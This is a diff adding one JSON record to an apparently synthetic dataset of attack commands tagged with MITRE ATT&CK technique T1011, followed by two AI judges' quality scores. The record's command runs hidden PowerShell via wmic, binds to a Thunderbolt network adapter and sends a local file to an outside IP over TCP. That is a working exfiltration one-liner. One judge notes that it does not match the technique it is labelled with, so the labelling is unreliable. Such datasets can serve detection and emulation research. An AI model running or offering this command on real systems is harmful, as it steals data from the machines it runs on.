@@ -1,0 +1,49 @@
+{
+  "technique_id": "T1011",
+  "platform": "Windows",
+  "shell": "Powershell",
+  "command": "wmic process call create \"powershell -NoProfile -WindowStyle Hidden -Command `$ifc=Get-WmiObject Win32_NetworkAdapterConfiguration | ?{ `$_.IPEnabled -and (`$_.Description -like '*Thunderbolt*') }; if(`$ifc){ `$ip=@(`$ifc.IPAddress | ?{ `$_ -match '^[0-9]{1,3}(\\.[0-9]{1,3}){3}$' })[0]; if(`$ip){ `$c=New-Object Net.Sockets.TcpClient; `$c.Client.Bind((New-Object Net.IPEndPoint ([Net.IPAddress]::Parse(`$ip),0))); `$c.Connect('203.0.113.155',54901); `$s=`$c.GetStream(); `$b=[IO.File]::ReadAllBytes('C:\\ProgramData\\Temp\\blob.dat'); `$s.Write(`$b,0,`$b.Length); `$s.Close(); `$c.Close() } }\"",
+  "explanation": "Invokes PowerShell via WMIC to bind to a Thunderbolt network adapter and send data over TCP to a non-standard port. Thunderbolt networking is used as an alternate medium to the primary network per T1011.",
+  "rationale_steps": [
+    "Locate a Thunderbolt NIC via WMI adapter description.",
+    "Bind a TCP client to the Thunderbolt interface's IPv4 address.",
+    "Connect to an external destination using a high, uncommon port.",
+    "Exfiltrate data over the Thunderbolt network path.",
+    "No persistent or system-wide network reconfiguration is performed."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1011-987933e0-4e9ac17f",
+  "source_prompt_hash": "987933e0",
+  "timestamp_utc": "2025-09-30T08:13:32.291694Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Command is well-formed with balanced quoting/braces, proper WMIC invocation, and correct PowerShell escaping/backticks for variables inside the -Command string.",
+        "semantic_score": 2,
+        "semantic_justification": "While it plausibly binds to a Thunderbolt adapter and exfiltrates a file over TCP to a non-standard port, it does not embed signals/covert data in legitimate traffic as described by Traffic Signaling (T1011) and instead performs straightforward TCP exfiltration.",
+        "combined_score": 3.5,
+        "confidence": 0.86,
+        "timestamp": "2025-10-01T17:44:12.521961Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed, with balanced quotes and parentheses, valid PowerShell constructs, and correctly formatted WMIC invocation; the backticks before variables are redundant but not syntactically incorrect for PowerShell.",
+        "semantic_score": 5,
+        "semantic_justification": "The command perfectly achieves the claimed intent by programmatically identifying and binding to a Thunderbolt network adapter's IP, then sending data over TCP, which is an operationally plausible implementation of using an alternate medium for traffic signaling under T1011.",
+        "combined_score": 5.0,
+        "confidence": 0.95,
+        "timestamp": "2025-10-01T17:44:37.169696Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 3.5,
+    "llm_average_score": 4.25,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
